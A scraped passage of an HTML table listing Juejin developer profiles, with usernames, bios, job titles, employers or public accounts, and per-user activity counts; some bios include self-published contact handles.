align="left">关注领域：Java/Kotlin 服务端、桌面端 、Android 、 机器学习、端侧智能</td><td align="left">全干工程师</td><td align="left">搬砖</td><td align="left">93</td><td align="left">3716</td><td align="left">244217</td><td align="left">2978</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2735240661441591">ClyingDeng</a></td><td align="left">-</td><td align="left">前端开发</td><td align="left">公众号：今天你敲代码了吗</td><td align="left">102</td><td align="left">2902</td><td align="left">61579</td><td align="left">179</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2867982785579102">速冻鱼</a></td><td align="left">大家好，我是速冻鱼🐟，一条水系前端💦，喜欢花里胡哨💐，持续沙雕🌲。 [微信:sudongyuer］</td><td align="left">🐟公众号:前端速冻鱼</td><td align="left">成都</td><td align="left">-</td><td align="left">66</td><td align="left">2057</td><td align="left">100548</td><td align="left">477</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2568933151092030">XiaoLin_Java</a></td><td align="left">问啥啥都会，干啥啥不行。公众号：不掉发进大厂，个人v：l18923403603，联系我免费加入督学班，视频作业不间断</td><td align="left">Java开发工程师</td><td align="left">👉不掉发进大厂👈</td><td align="left">99</td><td align="left">2601</td><td align="left">85119</td><td align="left">606</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1688472903498189">狗比玩意</a></td><td align="left">叫我奶糖就好啦</td><td align="left">web前端</td><td align="left">-</td><td align="left">6</td><td align="left">171</td><td align="left">16080</td><td align="left">135</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2524134427858205">居然🌾</a></td><td align="left">Python全栈工程师</td><td align="left">极客夜读  欢迎关注~</td><td align="left">逻辑教育</td><td align="left">28</td><td align="left">157</td><td align="left">8931</td><td align="left">92</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2119514117904295">小姐姐味道</a></td><td align="left">不羡鸳鸯不羡仙，一行代码调半天</td><td align="left">🏆掘金首批签约作者</td><td align="left">公众号：xjjdog</td><td align="left">261</td><td align="left">15898</td><td align="left">1275403</td><td align="left">24860</td><td align="left">6</td></tr><tr><td align="left"><a href="https://juejin.cn/user/976022056736765">ndz</a></td><td align="left">因上努力，果上随缘。</td><td align="left">全栈</td><td align="left">从此掘金就是我的抖音</td><td align="left">14</td><td align="left">698</td><td align="left">58586</td><td align="left">102</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2409780510207133">YK菌</a></td><td align="left">大家好，我是YK菌 🐷 ，一个微系前端 ✨，爱思考，爱总结，爱记录，爱分享 🏹，欢迎关注我呀 😘 ~ [微信号: yk2012yk2012，微信公众号：ykyk2012]</td><td align="left">前端领域终身学习者</td><td align="left">欢迎一键三连哦~</td><td align="left">127</td><td align="left">1815</td><td align="left">71640</td><td align="left">321</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/219558054476792">Flywith24</a></td><td align="left">🍜 铁厂干饭人<br>📸 业余 vlogger<br>🏀 篮球爱好者</td><td align="left">Android Developer</td><td align="left">快手</td><td align="left">63</td><td align="left">2531</td><td align="left">232487</td><td align="left">3724</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1591748568562829">尽管如此世界依然美丽</a></td><td align="left">-</td><td align="left">天命</td><td align="left">👻</td><td align="left">12</td><td align="left">397</td><td align="left">18943</td><td align="left">96</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/140339735966695">一颗雷布斯</a></td><td align="left">多学一点知识，少写一行代码。</td><td align="left">公众号</td><td align="left">知否技术</td><td align="left">31</td><td align="left">645</td><td align="left">48642</td><td align="left">100</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/166781498952974">vaelcy</a></td><td align="left">-</td><td align="left">前端开发工程师</td><td align="left">某上市公司</td><td align="left">33</td><td align="left">1258</td><td align="left">38817</td><td align="left">168</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/123624772082791">纪先生</a></td><td align="left">公众号：纪先生笔记(时刻雕刻你的身体&amp;&amp;灵魂)</td><td align="left">服务端｜公众号:纪先生笔记</td><td align="left">-</td><td align="left">34</td><td align="left">1048</td><td align="left">26152</td><td align="left">94</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3016715636842622">扫地盲僧</a></td><td align="left">行走在键盘上的钢琴师</td><td align="left">💥懂点产品的全栈工程师</td><td align="left">UU跑腿</td><td align="left">6</td><td align="left">614</td><td align="left">23679</td><td align="left">297</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1134351731144231">loongwind</a></td><td align="left">主要从事Android、Flutter、前端开发</td><td align="left">大前端开发工程师</td><td align="left">-</td><td align="left">11</td><td align="left">195</td><td align="left">20139</td><td align="left">271</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2717648473821736">CookieBoty</a></td><td align="left">工资到位，四皇干废</td><td align="left">前端小兵成长营</td><td align="left">-</td><td align="left">37</td><td align="left">4793</td><td align="left">272373</td><td align="left">2157</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3562846812382206">浪漫主义码农</a></td><td align="left">有人辞官归故里 有人星夜赶科考 前途似海来日方长。满怀希望就会所向披靡</td><td align="left">摸鱼小白</td><td align="left">-</td><td align="left">43</td><td align="left">368</td><td align="left">22596</td><td align="left">56</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2840793777447358">nathan_ll</a></td><td align="left">世界和平</td><td align="left">QDGCS</td><td align="left">-</td><td align="left">21</td><td align="left">124</td><td align="left">12891</td><td align="left">28</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3702810893364350">why技术</a></td><td align="left">用匠心敲代码，对每一行代码负责。</td><td align="left">java工程师</td><td align="left">公众号【why技术】</td><td align="left">92</td><td align="left">4109</td><td align="left">274315</td><td align="left">5438</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4002681548190045">mirsle马新杰</a></td><td align="left">-</td><td align="left">前端</td><td align="left">-</td><td align="left">2</td><td align="left">37</td><td align="left">2376</td><td align="left">6</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2084329779387864">大鱼丶</a></td><td align="left">每天进步一点点，慢一点，才能更快！</td><td align="left">Java  @公众号（全员格子）</td><td align="left">-</td><td align="left">109</td><td align="left">4553</td><td align="left">193886</td><td align="left">548</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3747583696308350">小虚竹and掘金</a></td><td align="left">Java领域优质创作者🏆，CSDN博客专家🏆，华为云享专家🏆<br>个人微信【xiamenzhw】欢迎问题咨询和技术交流</td><td align="left">-</td><td align="left">-</td><td align="left">74</td><td align="left">1941</td><td align="left">40130</td><td align="left">139</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1151943918501767">Angus安格斯</a></td><td align="left">将梦想用代码照进现实，🐛！</td><td align="left">前端工程师</td><td align="left">网易</td><td align="left">11</td><td align="left">468</td><td align="left">19353</td><td align="left">111</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2119514147536087">小黑说Java</a></td><td align="left">我是小黑，一个Java程序员。</td><td align="left">公众号@小黑说Java</td><td align="left">-</td><td align="left">58</td><td align="left">2168</td><td align="left">38443</td><td align="left">147</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1187128288217262">前端奶爸</a></td><td align="left">滴水之恩，当涌泉相报。</td><td align="left">前端小学生</td><td align="left">宇宙无敌不加班有限责任公司</td><td align="left">20</td><td align="left">343</td><td align="left">11503</td><td align="left">33</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2198625067468664">月夕</a></td><td align="left">代码绝不止能跑就行。QQ&amp;WX:1571356682</td><td align="left">前端研发工程师</td><td align="left">Baidu</td><td align="left">20</td><td align="left">502</td><td align="left">18298</td><td align="left">96</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4265760848090664">究极逮虾户</a></td><td align="left">不干正经事   WMRouter Contributor</td><td align="left">Android</td><td align="left">小破站</td><td align="left">51</td><td align="left">1802</td><td align="left">173331</td><td align="left">1434</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/659362706101735">yechaoa</a></td><td align="left">Android、前端、小程序、Flutter</td><td align="left">Android</td><td align="left">阿里巴巴</td><td align="left">24</td><td align="left">427</td><td align="left">42278</td><td align="left">183</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3069492194710797"><em>代码诗人</em></a></td><td align="left">路漫漫其修远兮，吾将上下而求索</td><td align="left">八阿哥终结者</td><td align="left">月弦笙音</td><td align="left">59</td><td align="left">713</td><td align="left">34626</td><td align="left">66</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1591748567762776">渔翁莫小尚</a></td><td align="left">还有几根头发的前端攻城狮🦁<br>期待大家的关注，我们一起进步😊<br>『公众号：JavaScript_mxshang』</td><td align="left">公众号@ 前端渔翁莫小尚</td><td align="left">-</td><td align="left">23</td><td align="left">80</td><td align="left">2990</td><td align="left">4</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4265760845468296">夏天要喝冰可乐</a></td><td align="left">种一棵树最好的时机是十年前，其次是现在</td><td align="left">前端</td><td align="left">武汉某公司</td><td align="left">19</td><td align="left">189</td><td align="left">37154</td><td align="left">53</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1380642337591822">Cora</a></td><td align="left">-</td><td align="left">前端开发工程师</td><td align="left">-</td><td align="left">3</td><td align="left">22</td><td align="left">897</td><td align="left">8</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3808363977640301">LinkedBear</a></td><td align="left">手撕源码。。。算爱好吗[狗头]</td><td align="left">柯基小册四件套作者 &amp; 底层技术研究者与分享者</td><td align="left">-</td><td align="left">9</td><td align="left">357</td><td align="left">20608</td><td align="left">859</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4169810296974189">Lucifer三思而后行</a></td><td align="left">一枚喜欢学习，专研，输出的数据库DBA，专注于各种数据库、Linux等后端技术，分享各种干货实战文！<br><br>灵感来源于生活，故而热爱生活~</td><td align="left">微信公众号：Lucifer三思而后行</td><td align="left">-</td><td align="left">132</td><td align="left">5043</td><td align="left">177099</td><td align="left">278</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1556564195161725">字节流动</a></td><td align="left">Android  音视频开发。熟悉 OpenGL ES 、FFmpeg、Camera、OpenCL 。</td><td align="left">公众号: 字节流动</td><td align="left">字节流动</td><td align="left">67</td><td align="left">647</td><td align="left">144124</td><td align="left">1065</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4029089079886935">肉包子_子</a></td><td align="left">来者犹可追</td><td align="left">来者犹可追</td><td align="left">-</td><td align="left">46</td><td align="left">67</td><td align="left">3575</td><td align="left">7</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3562073406058808">ITEM</a></td><td align="left">微信: hello-node；公众号：前端搬砖工</td><td align="left">知乎：前端周刊</td><td align="left">深大智能</td><td align="left">10</td><td align="left">5098</td><td align="left">127827</td><td align="left">1492</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/852876754422039">许进进</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">43</td><td align="left">335</td><td align="left">18077</td><td align="left">44</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2955949488212014">一条coding</a></td><td align="left">关注公众号「一条coding」获取100本电子书、Java学习路线、10G学习资料</td><td align="left">公众号：一条coding</td><td align="left">-</td><td align="left">63</td><td align="left">2225</td><td align="left">39327</td><td align="left">210</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3324570057847880">JaylenL</a></td><td align="left">前端/nodejs/python/C++，探索从未停止</td><td align="left">前端工程师@有赞</td><td align="left">杭州有赞科技有限公司</td><td align="left">36</td><td align="left">699</td><td align="left">20353</td><td align="left">68</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/536217406942206">前端破坏球</a></td><td align="left">视界之外，想象之中</td><td align="left">杭州-搬砖</td><td align="left">-</td><td align="left">10</td><td align="left">283</td><td align="left">15499</td><td align="left">47</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3325387851438670">空格de鱼</a></td><td align="left">做自己喜欢的事情</td><td align="left">前端开发</td><td align="left">-</td><td align="left">10</td><td align="left">56</td><td align="left">5307</td><td align="left">9</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/607347248750103">前端老实人</a></td><td align="left">个人微：【 wx2646921615 】华为云云享专家，阿里云专家博主，c站优质创作者，一名前端狂热爱好者，有需要资料或者有问题的同学可以直接私信我哦，做你的私人小家教！</td><td align="left">公众号</td><td align="left">前端老实人</td><td align="left">-</td><td align="left">99</td><td align="left">2596</td><td align="left">39468</td><td align="left">188</td></tr><tr><td align="left"><a href="https://juejin.cn/user/712139267643054">JavaGieGie</a></td><td align="left">专注系列教程，目前在更课程有《并发编程系列》《mysql系列》，后期会持续更新系列《花哥与redis》《花哥与mq》，文章内容诙谐幽默，同时不失技术深度</td><td align="left">公众号 @ 花哥编程</td><td align="left">-</td><td align="left">66</td><td align="left">1663</td><td align="left">118146</td><td align="left">535</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/835284568644983">滑稽诺夫</a></td><td align="left">-</td><td align="left">-</td><td align="left">摸鱼科技</td><td align="left">18</td><td align="left">9</td><td align="left">1456</td><td align="left">11</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/254742426041422">勇敢牛牛2021</a></td><td align="left">-</td><td align="left">Android开发</td><td align="left">-</td><td align="left">124</td><td align="left">314</td><td align="left">30358</td><td align="left">59</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2524134386185736">扔物线</a></td><td align="left">rengwuxian.com 给高级 Android 工程师的进阶手册</td><td align="left">Android &amp; Kotlin GDE</td><td align="left">扔物线学堂</td><td align="left">43</td><td align="left">8501</td><td align="left">374206</td><td align="left">13706</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4177799915777389">北斗落凡尘</a></td><td align="left">-</td><td align="left">前端刨食</td><td align="left">-</td><td align="left">92</td><td align="left">1608</td><td align="left">25026</td><td align="left">43</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2330620350432110">JowayYoung</a></td><td align="left">[玩转CSS的艺术之美]作者，[IQ前端]号主</td><td align="left">资深前端，总结大师</td><td align="left">网易</td><td align="left">21</td><td align="left">23003</td><td align="left">687276</td><td align="left">16219</td><td align="left">6</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1099167357226904">zxhtom</a></td><td align="left">是时候底层结构了解了。不能仅仅局限于curd</td><td align="left">公众号</td><td align="left">zxhtom</td><td align="left">公众号，微信同名</td><td align="left">160</td><td align="left">3659</td><td align="left">295083</td><td align="left">433</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1908407918660359">伊人a</a></td><td align="left">前端面试有个很好的公众号推荐给大家☛前端面试官☚<br><br>爱玩游戏、爱生活、爱技术、爱自己。</td><td align="left">打野无敌</td><td align="left">王者峡谷</td><td align="left">3</td><td align="left">4156</td><td align="left">176017</td><td align="left">1765</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/800878606427239">Onion韩</a></td><td align="left">-</td><td align="left">一捆前端小韭菜🚗</td><td align="left">-</td><td align="left">28</td><td align="left">453</td><td align="left">13562</td><td align="left">40</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/96412754251390">lio_zero</a></td><td align="left">来一场好运设计 岑寂中侧耳倾听</td><td align="left">无</td><td align="left">无</td><td align="left">78</td><td align="left">848</td><td align="left">32020</td><td align="left">79</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2137106333044861">黄轶</a></td><td align="left">公众号[老黄的前端私房菜]</td><td align="left">前端架构师</td><td align="left">zoom.us</td><td align="left">22</td><td align="left">9286</td><td align="left">402895</td><td align="left">12634</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1742080815409336">香菜聊游戏</a></td><td align="left">写了十来年的代码，当过小兵，创过业，<br>公众号:香菜聊游戏，关注我，有干货和游戏源码哦，带你走进游戏圈</td><td align="left">公众号：香菜聊游戏</td><td align="left">-</td><td align="left">113</td><td align="left">215</td><td align="left">19354</td><td align="left">34</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2999123452123181">蛙人</a></td><td align="left">永远做个学生，保持终生学习</td><td align="left">公众号: 前端娱乐圈</td><td align="left">-</td><td align="left">33</td><td align="left">5252</td><td align="left">183340</td><td align="left">929</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1239904845577757">樱舞</a></td><td align="left">-</td><td align="left">前端工程师</td><td align="left">-</td><td align="left">61</td><td align="left">153</td><td align="left">18196</td><td align="left">10</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3378167164966920">学习react中</a></td><td align="left">-</td><td align="left">前端</td><td align="left">科技有限公司</td><td align="left">7</td><td align="left">4</td><td align="left">379</td><td align="left">0</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/764915820276439">ZeroFlutter</a></td><td align="left">6 年 App 开发经验，18 年自学 Flutter，目前主导上线了 4 款企业级 Flutter App，当前负责的 App 累计用户超百万 ，关注我学习优质 Flutter 内容</td><td align="left">Flutter 高级工程师</td><td align="left">班级小管家</td><td align="left">40</td><td align="left">630</td><td align="left">47956</td><td align="left">377</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4054654613988718">夕水</a></td><td align="left">喜欢代码，读书，文学</td><td align="left">web前端开发</td><td align="left">-</td><td align="left">25</td><td align="left">337</td><td align="left">24383</td><td align="left">104</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4265760844943479">芝麻粒儿</a></td><td align="left">需要各种资源分享（网站、工具、素材、源码、游戏等），欢迎联系交朋友。</td><td align="left">微信：XQL8686</td><td align="left">-</td><td align="left">105</td><td align="left">1386</td><td align="left">51936</td><td align="left">83</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1046390799088622">前端恶霸</a></td><td align="left">积淀，如麦熟雨落，静默却磅礴</td><td align="left">前端工程师</td><td align="left">前端恶霸</td><td align="left">20</td><td align="left">760</td><td align="left">23261</td><td align="left">61</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3210229682022888">sweetying</a></td><td align="left">Android 开发者，专注技术提升</td><td align="left">公众号 @ sweetying</td><td align="left">-</td><td align="left">20</td><td align="left">1840</td><td align="left">54667</td><td align="left">448</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3051900006837213">Gracker</a></td><td align="left">专注于 Android 性能、功耗、稳定性、内存、框架技术等，个人简介：<a href="https://www.androidperformance.com/about%EF%BC%8C%E6%AC%A2%E8%BF%8E%E5%8A%A0%E5%A5%BD%E5%8F%8B%E4%BA%A4%E6%B5%81">https://www.androidperformance.com/about，欢迎加好友交流</a></td><td align="left">Android 系统工程师</td><td align="left">Pied Piper</td><td align="left">39</td><td align="left">390</td><td align="left">47653</td><td align="left">999</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3227821827961806">glmapper</a></td><td align="left">GitHub:<a href="https://github.com/glmapper">https://github.com/glmapper</a></td><td align="left">公众号：PeomByte</td><td align="left">HM</td><td align="left">118</td><td align="left">5275</td><td align="left">430865</td><td align="left">8395</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3500461756268285">前端罗纳尔多</a></td><td align="left">互相学习，互相帮助，互相分享</td><td align="left">前端工程师 加qq群343051772进微信学习群</td><td align="left">-</td><td align="left">10</td><td align="left">126</td><td align="left">2338</td><td align="left">28</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1460594842018446">小丞同学</a></td><td align="left">电子信息类大二学生，目前学习方向前端，有兴趣的可以一起学习交流噢，也可以私聊添加我的微信一起探讨合作</td><td align="left">前端开发</td><td align="left">微信：Ljc-10c</td><td align="left">-</td><td align="left">95</td><td align="left">2250</td><td align="left">64262</td><td align="left">254</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3931509310625214">起小就些熊</a></td><td align="left">-</td><td align="left">前端工程师</td><td align="left">那年那时那片云</td><td align="left">16</td><td align="left">739</td><td align="left">31440</td><td align="left">119</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1574156383551629">前端卞同学</a></td><td align="left">-</td><td align="left">前端开发工程师</td><td align="left">漫蝌网</td><td align="left">19</td><td align="left">75</td><td align="left">902</td><td align="left">4</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3350967171943598">李三火</a></td><td align="left">-</td><td align="left">前端</td><td align="left">360</td><td align="left">3</td><td align="left">23</td><td align="left">982</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1556564197255975">付十一</a></td><td align="left">日知为智，爱技术爱生活</td><td align="left">Android开发者</td><td align="left">-</td><td align="left">29</td><td align="left">1262</td><td align="left">91203</td><td align="left">537</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3350967174569134">风信子FE</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">7</td><td align="left">14</td><td align="left">3934</td><td align="left">4</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/852876752066653">hauk0101</a></td><td align="left">折腾不止于前端</td><td align="left">攻城狮</td><td align="left">公众号闲散将军府</td><td align="left">12</td><td align="left">115</td><td align="left">15990</td><td align="left">23</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1433418892058333">于五五</a></td><td align="left">写作，让自己能去阅读更多的知识</td><td align="left">前端开发工程师</td><td align="left">是个小秘密</td><td align="left">30</td><td align="left">275</td><td align="left">34570</td><td align="left">39</td><td align="left">2</td></tr><tr><td align="left"><br>WX: KC_Cooci</td><td align="left">前端、iOS重度爱好者、专治跳槽加薪</td><td align="left">LG</td><td align="left">63</td><td align="left">2469</td><td align="left">230436</td><td align="left">4751</td><td align="left">3</td><td align="left"></td></tr><tr><td align="left"><a href="https://juejin.cn/user/2788017216685118">zxg_神说要有光</a></td><td align="left">小册《babel插件通关秘籍》已上线</td><td align="left">公号「神光的编程秘籍」</td><td align="left">-</td><td align="left">116</td><td align="left">8001</td><td align="left">412884</td><td align="left">4018</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2524134427070071">木亦Sam</a></td><td align="left">一定要拿出做旅游攻略的热忱来计划每天。liluanhui-site</td><td align="left">Web前端工程师</td><td align="left">普方立民</td><td align="left">51</td><td align="left">2813</td><td align="left">94464</td><td align="left">282</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/325111173102669">慕枫技术笔记</a></td><td align="left">CSDN博客专家、专注源码分析、架构设计、分享所思所想</td><td align="left">公众号：慕枫技术笔记</td><td align="left">Alibaba</td><td align="left">28</td><td align="left">208</td><td align="left">15273</td><td align="left">47</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2647279731751255">jjjona0215</a></td><td align="left">像风一样</td><td align="left">前端</td><td align="left">京东</td><td align="left">39</td><td align="left">654</td><td align="left">54979</td><td align="left">143</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2084329779108062">陈_杨</a></td><td align="left">大家好，我叫陈杨，是一名老实吧啦的程序员，微信公众号：程序员直通车</td><td align="left">前端工程师</td><td align="left">程序员直通车</td><td align="left">42</td><td align="left">709</td><td align="left">48776</td><td align="left">96</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/686575843556008">IT学习日记v</a></td><td align="left">只搞干货,专注JAVA、数据库领域等后端领域知识。个人微信【yyuuyy1235】获取实战源码，学习、交流、合作、交友请联系！</td><td align="left">-</td><td align="left">公众号: IT学习日记</td><td align="left">26</td><td align="left">942</td><td align="left">30615</td><td align="left">103</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/114004940034056">敲代码的小菜鸡</a></td><td align="left">Q</td><td align="left">web前端</td><td align="left">不知名小厂</td><td align="left">9</td><td align="left">135</td><td align="left">4769</td><td align="left">24</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4001878053227127">JeffreyAI</a></td><td align="left">Android Developer - Yokagames<br>Ex - RavenTech（YC W15）<br>AI、Arts、music、sketch、outdoor<br><br>Email:<br><a href="mailto:&#106;&#x65;&#102;&#102;&#114;&#x65;&#x79;&#120;&#117;&#46;&#x77;&#x6f;&#114;&#108;&#x64;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#106;&#x65;&#102;&#102;&#114;&#x65;&#x79;&#120;&#117;&#46;&#x77;&#x6f;&#114;&#108;&#x64;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a><br><br>Github:<br><a href="https://github.com/jeffreyxuworld">https://github.com/jeffreyxuworld</a></td><td align="left">Android开发</td><td align="left">杭州游卡网络技术有限公司</td><td align="left">7</td><td align="left">38</td><td align="left">2238</td><td align="left">14</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1626932942224398">金色小芝麻</a></td><td align="left">不畏惧，不将就，未来的日子好好努力</td><td align="left">Web前端开发</td><td align="left">-</td><td align="left">72</td><td align="left">4673</td><td align="left">246085</td><td align="left">4615</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3386151546961294">zz</a></td><td align="left">-</td><td align="left">前端</td><td align="left">布谷鸟工作室</td><td align="left">28</td><td align="left">2713</td><td align="left">249158</td><td align="left">479</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2233819792682760">zhouhuandev</a></td><td align="left">不忘初心，方得始终。</td><td align="left">Android</td><td align="left">小万达</td><td align="left">2</td><td align="left">25</td><td align="left">2046</td><td align="left">14</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/588993963758215">i听风逝夜</a></td><td align="left">假设这里有简介</td><td align="left">Jvav攻城狮</td><td align="left">-</td><td align="left">73</td><td align="left">555</td><td align="left">61237</td><td align="left">104</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/78820569533070">Quyunshuo</a></td><td align="left">特长：腿</td><td align="left">Android developer</td><td align="left">中孚信息</td><td align="left">14</td><td align="left">711</td><td align="left">35248</td><td align="left">227</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2963939081348958">小码哥Damon</a></td><td align="left">长期从事微服务架构设计，结合Docker、K8s做微服务容器化，自动化部署等一站式项目部署、落地。目前主要从事基于K8s云原生架构研发的工作。Golang语言开发，长期研究边缘计算框架KubeEdge、调度框架Volcano等。</td><td align="left">基础架构工程师</td><td align="left">-</td><td align="left">47</td><td align="left">545</td><td align="left">17158</td><td align="left">81</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/940837682025896">Ving</a></td><td align="left">幡然醒悟之时，却已反常到无话不谈。</td><td align="left">厨子码农</td><td align="left">飞常准</td><td align="left">10</td><td align="left">17</td><td align="left">2447</td><td align="left">15</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/43636195606333">小小乔</a></td><td align="left">一个热爱技术、喜欢专研新领域的技术小姐姐</td><td align="left">前端开发</td><td align="left">-</td><td align="left">12</td><td align="left">18</td><td align="left">3240</td><td align="left">8</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/773647863649895">Duncan</a></td><td align="left">只分享干货</td><td align="left">前端搬砖达人</td><td align="left">-</td><td align="left">3</td><td align="left">286</td><td align="left">15281</td><td align="left">56</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/413072103836279">小小俊</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">19</td><td align="left">27</td><td align="left">1585</td><td align="left">3</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/712139267910237">树酱</a></td><td align="left">唱跳rap工程🌲 ( 微信:Little_tree_o )</td><td align="left">Apifox</td><td align="left">API管理神器</td><td align="left">54</td><td align="left">8747</td><td align="left">411464</td><td align="left">5849</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2981531263709735">izsm</a></td><td align="left">-</td><td align="left">iOS</td><td align="left">-</td><td align="left">35</td><td align="left">128</td><td align="left">15112</td><td align="left">68</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1838039171075352">彭道宽</a></td><td align="left">小册《Electron + React 从 0 到 1 实现简历平台实战》作者，江湖人称“彭于晏广州分晏”</td><td align="left">SugarTurboS Club 成员</td><td align="left">CVTE</td><td align="left">36</td><td align="left">3078</td><td align="left">157360</td><td align="left">1134</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/254742429175352">红尘炼心</a></td><td align="left">Vue、React、uni-app、Webpack</td><td align="left">web前端工程师</td><td align="left">··</td><td align="left">114</td><td align="left">12937</td><td align="left">574139</td><td align="left">3399</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1063982987230392">彭丑丑</a></td><td align="left">🔥Hi，我是丑丑。这里有 Android 进阶成长路线笔记 &amp; 博客，欢迎跟着彭丑丑一起成长。（联系方式 &amp; 入群方式在 GitHub）</td><td 